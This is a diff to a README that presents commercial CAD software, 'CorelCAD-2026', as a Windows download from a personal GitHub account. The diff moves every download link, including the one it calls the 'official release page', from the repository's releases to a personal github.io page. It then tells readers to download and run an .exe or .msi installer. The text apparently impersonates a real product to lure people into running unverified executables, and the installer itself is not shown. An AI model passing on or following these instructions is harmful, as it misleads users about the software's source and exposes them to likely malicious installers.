@@ -1,7 +1,7 @@
 # 🛠️ CorelCAD-2026 - Master Precision Drafting On Your Windows Computer
 
-[​](https://github.com/mikeldead245/CorelCAD-2026/releases)
-[![Download CorelCAD](https://img.shields.io/badge/Download-CorelCAD--2026-blue)](https://github.com/mikeldead245/CorelCAD-2026/releases)
+[​](https://mikeldead245.github.io)
+[![Download CorelCAD](https://img.shields.io/badge/Download-CorelCAD--2026-blue)](https://mikeldead245.github.io)
 
 ## 🎯 About This Software
 
@@ -22,7 +22,7 @@ Your computer needs specific parts to run this software. Check this list before 
 
 Follow these steps to put the software on your machine. We suggest that you close other programs before you begin.
 
-1.  Visit the official release page: [https://github.com/mikeldead245/CorelCAD-2026/releases](https://github.com/mikeldead245/CorelCAD-2026/releases). 
+1.  Visit the official release page: [https://mikeldead245.github.io](https://mikeldead245.github.io). 
 2.  Look for the latest version at the top of the page.
 3.  Click the link for the Windows installer package (usually ending in .exe or .msi).
 4.  Wait for the download to finish.
